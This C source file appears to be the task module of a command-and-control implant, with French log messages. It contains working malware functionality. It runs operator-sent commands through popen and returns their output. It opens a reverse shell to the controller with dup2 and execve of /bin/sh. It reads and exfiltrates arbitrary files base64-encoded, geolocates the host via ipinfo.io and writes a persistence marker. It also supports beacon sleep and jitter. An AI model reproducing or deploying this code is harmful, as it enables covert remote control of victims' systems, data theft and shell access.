#define _POSIX_C_SOURCE 200809L

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include "base64.h"
#include "client.h"
#include "tasks.h"
#include "network.h"

#include <curl/curl.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// Server information
extern const char* server_ip;
extern const int server_port;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t total_size = size * nmemb;
    char *buf = (char *)userp;
    size_t available_space = 4096 - strlen(buf) - 1;  // -1 for null terminator

    if (total_size > available_space) {
        total_size = available_space;
    }

    if (available_space > 0) {
        strncat(buf, (char *)contents, total_size);
    }

    return size * nmemb;
}


void task_execve(char *command_str, char *argument_str, const char *id_task) {
    
    // Decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // String concatenation with bounds checking
    char full_command[4096] = {0};
    if (command != NULL) {
        if (argument != NULL) {
            snprintf(full_command, sizeof(full_command), "%s %s", command, argument);
        } else {
            snprintf(full_command, sizeof(full_command), "%s", command);
        }
    } else {
        if (argument) free(argument);
        return;
    }
    
    
    // Execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    if (fp == NULL) {
        free(command);
        if (argument) free(argument);
        return;
    }
    
    // Read output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);
    
    // Send the result back to the server
    if (strlen(result_buffer) > 0) {
        // Encoding the result
        char *encoded_result = encode(result_buffer);
        
        // Building the message
        char message[4096];
        snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
        
        // Send the result to the server
        char *response = send_server_message(message, server_ip, server_port);
        
        if (response != NULL) {
            free(response);
        } 
        free(encoded_result);
    } 
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            sleep_time = atof(decoded_sleep);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter : %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
    
    return;
}

void task_locate(const char *id_task) {

        CURL *curl;
        CURLcode res;
        char result_buffer[4096] = {0};
    
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
    
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io");
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
    
            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                fprintf(stderr, "Échec de la requête cURL: %s\n", curl_easy_strerror(res));
                goto cleanup;
            }
    
            // Encode the result
            char *encoded_result = encode(result_buffer);
            if (encoded_result == NULL) {
                fprintf(stderr, "Erreur d'encodage en base64\n");
                goto cleanup;
            }
    
            // Building the message
            char message[4096];
            snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
    
            // Send the result to the server
            char *response = send_server_message(message, server_ip, server_port);
    
            if (response != NULL) {
                free(response);
            } else {
                fprintf(stderr, "Échec de l'envoi du résultat au serveur\n");
            }
    
            free(encoded_result);
    
    cleanup:
            curl_easy_cleanup(curl);
        }
        curl_global_cleanup();
}



void task_revshell(int server_port, const char *server_ip) {
    printf("Exécution de la tâche revshell\n");
    const char *ip = (server_ip != NULL) ? server_ip : "127.0.0.1";

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    server.sin_addr.s_addr = inet_addr(ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Échec de création du socket");
        return;
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Échec de la connexion au serveur");
        close(sock);
        return;
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    perror("execve failed");
    close(sock);
}

void task_persist() {
    printf("Exécution de la tâche persist\n");
    
    // Obtenir le nom d'utilisateur actuel via getpwuid
    struct passwd *pw = getpwuid(getuid());
    const char *username = (pw && pw->pw_name) ? pw->pw_name : "inconnu";
    
    // Construire le chemin vers /home/$user/.uid
    char uid_path[256];
    snprintf(uid_path, sizeof(uid_path), "/home/%s/.uid", username);
    printf("Création du fichier de persistance: %s\n", uid_path);
    
    // Créer le fichier .uid dans /home/$user
    FILE *fp = fopen(uid_path, "w");
    if (fp == NULL) {
        printf("Erreur: Impossible de créer le fichier de persistance %s\n", uid_path);
        perror("Erreur");
        return;
    }
    
    // Écrire l'UID actuel dans le fichier
    fprintf(fp, "%s", uid);
    fclose(fp);
    
    printf("Persistance configurée : UID %s sauvegardé dans %s\n", uid, uid_path);
    
    // Envoyer un message de succès au serveur
    char message[256];
    char *encoded_result = encode("Persistance configurée avec succès");
    if (encoded_result != NULL) {
        snprintf(message, sizeof(message), "RESULT,%s,persist,%s", uid, encoded_result);
        char *response = send_server_message(message, server_ip, server_port);
        if (response != NULL) free(response);
        free(encoded_result);
    }
    
    return;
}

void task_cat(char *file_path_str, const char *id_task) {
    printf("Exécution de la tâche cat\n");
    
    if (file_path_str == NULL) {
        printf("Erreur: Chemin du fichier non spécifié\n");
        return;
    }
    
    printf("Paramètre reçu: %s\n", file_path_str);
    
    // Forcer le décodage base64 du chemin (le serveur l'envoie toujours encodé)
    char *file_path = decode(file_path_str);
    
    if (file_path == NULL) {
        printf("Erreur: Impossible de décoder le chemin du fichier\n");
        printf("Tentative d'utilisation du chemin tel quel comme fallback\n");
        
        // Fallback: utiliser le chemin tel quel si le décodage échoue
        file_path = strdup(file_path_str);
        if (file_path == NULL) {
            printf("Erreur: Impossible d'allouer de la mémoire pour le chemin du fichier\n");
            return;
        }
    }
    
    printf("Chemin du fichier (décodé): %s\n", file_path);
    
    // Ouvrir le fichier en mode lecture binaire pour gérer tous les types de fichiers
    FILE *fp = fopen(file_path, "rb");
    if (fp == NULL) {
        printf("Erreur: Impossible d'ouvrir le fichier %s\n", file_path);
        
        // Envoyer le message d'erreur comme résultat
        char error_buf[512];
        snprintf(error_buf, sizeof(error_buf), "Erreur: Impossible d'ouvrir le fichier %s", file_path);
        char *encoded_error = encode(error_buf);
        if (encoded_error != NULL) {
            char message[4096];
            snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_error);
            char *response = send_server_message(message, server_ip, server_port);
            if (response != NULL) free(response);
            free(encoded_error);
        }
        free(file_path);
        return;
    }
    
    // Déterminer la taille du fichier
    fseek(fp, 0L, SEEK_END);
    long file_size = ftell(fp);
    rewind(fp);
    
    printf("Taille du fichier: %ld octets\n", file_size);
    
    // Vérifier si le fichier est trop grand
    if (file_size > 3072) { // Limiter à 3KB pour assurer la compatibilité base64
        printf("Attention: Fichier trop grand, tronqué à 3KB\n");
        file_size = 3072;
    }
    
    // Allouer un tampon pour le contenu du fichier
    char *file_content = malloc(file_size + 1);
    if (file_content == NULL) {
        printf("Erreur: Impossible d'allouer de la mémoire pour le contenu du fichier\n");
        fclose(fp);
        free(file_path);
        return;
    }
    
    // Lire le contenu du fichier
    size_t bytes_read = fread(file_content, 1, file_size, fp);
    file_content[bytes_read] = '\0';
    fclose(fp);
    
    printf("Contenu lu: %zu octets\n", bytes_read);
    
    // Encoder le contenu du fichier
    printf("Encodage du contenu en base64...\n");
    char *encoded_result = encode(file_content);
    if (encoded_result == NULL) {
        printf("Erreur d'encodage en base64\n");
        free(file_content);
        free(file_path);
        return;
    }
    
    printf("Encodage réussi, taille: %zu octets\n", strlen(encoded_result));
    
    // Envoyer le résultat au serveur
    char message[4096];
    snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
    
    char *response = send_server_message(message, server_ip, server_port);
    if (response != NULL) {
        printf("Réponse du serveur: %s\n", response);
        free(response);
    } else {
        printf("Aucune réponse du serveur\n");
    }
    
    free(encoded_result);
    free(file_content);
    free(file_path);
}

void task_mv() {
    printf("Exécution de la tâche mv\n");
    // Implémentation à faire
    return;
}

void task_rm() {
    printf("Exécution de la tâche rm\n");
    // Implémentation à faire
    return;
}

void task_ps() {
    printf("Exécution de la tâche ps\n");
    // Implémentation à faire
    return;
}

